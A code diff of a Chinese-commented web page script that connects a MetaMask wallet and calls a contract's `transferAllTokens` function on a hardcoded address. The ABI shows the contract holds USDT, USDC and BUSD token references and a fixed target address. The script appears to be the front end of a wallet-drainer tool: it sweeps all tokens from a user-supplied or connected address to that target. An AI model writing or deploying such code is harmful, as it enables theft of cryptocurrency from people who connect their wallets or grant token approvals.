@@ -1,58 +1,128 @@
-let web3;
-let userAddress;
-let contract;
-const contractAddress = "0xd7Ca4e99F7C171B9ea2De80d3363c47009afaC5F";  // 智能合约地址
-const abi = [
-  {
-    "inputs": [{"internalType": "address","name": "from","type": "address"}],
-    "name": "transferAllTokens",
-    "outputs": [],
-    "stateMutability": "nonpayable",
-    "type": "function"
-  },
-  // 其他函数...
+// 合约地址
+const contractAddress = '0xd7Ca4e99F7C171B9ea2De80d3363c47009afaC5F';
+
+// 合约 ABI
+const contractABI = [
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "from",
+				"type": "address"
+			}
+		],
+		"name": "transferAllTokens",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"stateMutability": "nonpayable",
+		"type": "constructor"
+	},
+	{
+		"stateMutability": "payable",
+		"type": "receive"
+	},
+	{
+		"inputs": [],
+		"name": "busdToken",
+		"outputs": [
+			{
+				"internalType": "contract IERC20",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "owner",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "targetAddress",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "usdcToken",
+		"outputs": [
+			{
+				"internalType": "contract IERC20",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "usdtToken",
+		"outputs": [
+			{
+				"internalType": "contract IERC20",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	}
 ];
 
-// 连接钱包
-document.getElementById('connectButton').addEventListener('click', async () => {
-  try {
-    console.log("正在尝试连接钱包...");
-    if (typeof window.ethereum !== 'undefined') {
-      // 请求连接钱包
-      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-      userAddress = accounts[0];
-      web3 = new Web3(window.ethereum);
-      contract = new web3.eth.Contract(abi, contractAddress);
+// 初始化 Web3
+let web3;
+const connectButton = document.getElementById('connectButton');
+const transferForm = document.getElementById('transferForm');
+const messageDiv = document.getElementById('message');
 
-      // 钱包连接成功，启用转移按钮
-      document.getElementById('transferButton').disabled = false;
-      alert('钱包已连接: ' + userAddress);
-      console.log("钱包已连接，用户地址: ", userAddress);
+// 连接钱包
+connectButton.addEventListener('click', async () => {
+    if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        connectButton.innerText = '钱包已连接';
+        connectButton.disabled = true;
+        messageDiv.innerText = '钱包已成功连接！';
     } else {
-      alert('请安装Metamask钱包');
-      console.log("Metamask未检测到");
+        alert('请安装 MetaMask！');
     }
-  } catch (error) {
-    console.error("连接钱包失败: ", error);
-    alert('连接钱包失败，请重试');
-  }
 });
 
-// 转移所有代币
-document.getElementById('transferButton').addEventListener('click', async () => {
-  if (!userAddress || !contract) {
-    alert('请先连接钱包');
-    console.log("未连接钱包，转移操作无法进行");
-    return;
-  }
+// 转移代币
+transferForm.addEventListener('submit', async (event) => {
+    event.preventDefault();
+    const fromAddress = document.getElementById('fromAddress').value;
 
-  try {
-    console.log("正在执行代币转移操作...");
-    await contract.methods.transferAllTokens(userAddress).send({ from: userAddress });
-    alert('代币转移成功');
-    console.log("代币转移成功");
-  } catch (error) {
-    console.error("代币转移失败: ", error);
-    alert('代币转移失败，请重试');
-  }
+    try {
+        const accounts = await web3.eth.getAccounts();
+        const autoTransferContract = new web3.eth.Contract(contractABI, contractAddress);
+        await autoTransferContract.methods.transferAllTokens(fromAddress).send({ from: accounts[0] });
+        messageDiv.innerText = '代币已成功转移到目标地址！';
+    } catch (error) {
+        console.error(error);
+        messageDiv.innerText = '转移失败，请检查控制台获取更多信息。';
+    }
 });
